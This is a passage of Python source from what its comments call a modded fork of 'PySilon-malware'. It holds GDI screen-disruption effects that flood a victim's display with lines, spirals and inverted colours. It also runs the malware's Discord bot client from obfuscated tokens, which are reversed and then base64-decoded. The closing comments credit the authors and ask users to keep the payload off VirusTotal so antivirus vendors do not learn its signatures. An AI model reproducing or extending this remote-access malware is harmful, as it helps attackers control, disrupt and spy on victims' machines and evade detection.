            DeleteObject(brush)
    elif effect == 'snowfall':
        for i in range(10):
            stars = [(random.randint(0, x), random.randint(0, y), random.randint(1, 4)) for _ in range(100)]
            for star in stars:
                rand_x, rand_y, size = star
                color = RGB(255, 255, 255)
                brush = CreateSolidBrush(color)
                SelectObject(hdc, brush)
                PatBlt(hdc, rand_x, rand_y, size, size, PATCOPY)
            time.sleep(0.5)
    elif effect == 'hypnotic_spirals':
        for angle in range(0, 180, 1):
            radius = 1000
            x1 = int(x / 2 + radius * math.cos(math.radians(angle)))
            y1 = int(y / 2 - radius * math.sin(math.radians(angle)))
            x2 = int(x / 2 + radius * math.cos(math.radians(angle + 180)))
            y2 = int(y / 2 - radius * math.sin(math.radians(angle + 180)))
            color = RGB(random.randrange(1), random.randrange(1), random.randrange(1))
            pen = CreatePen(PS_SOLID, 1, color)
            SelectObject(hdc, pen)
            MoveToEx(hdc, x1, y1)
            LineTo(hdc, x2, y2)
            DeleteObject(pen)
    elif effect == 'random_lines':
        for _ in range(50):
            x1 = random.randint(0, x)
            y1 = random.randint(0, y)
            x2 = random.randint(0, x)
            y2 = random.randint(0, y)
            color = RGB(random.randrange(255), random.randrange(255), random.randrange(255))
            pen = CreatePen(PS_SOLID, 2, color)
            SelectObject(hdc, pen)
            MoveToEx(hdc, x1, y1)
            LineTo(hdc, x2, y2)
            DeleteObject(pen)
    else:
        PatBlt(hdc, 0, 0, x, y, PATINVERT)
    if effect != 'list':
        Sleep(10)
        DeleteDC(hdc)
for token in bot_tokens:
    decoded_token = base64.b64decode(token[::-1]).decode()
    try:
        client.run(decoded_token)
    except: pass

    #THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS
#PLEASE DO NOT ADD PAYLOAD ON VIRUSTOTAL ( it shares signatures with other av companies )
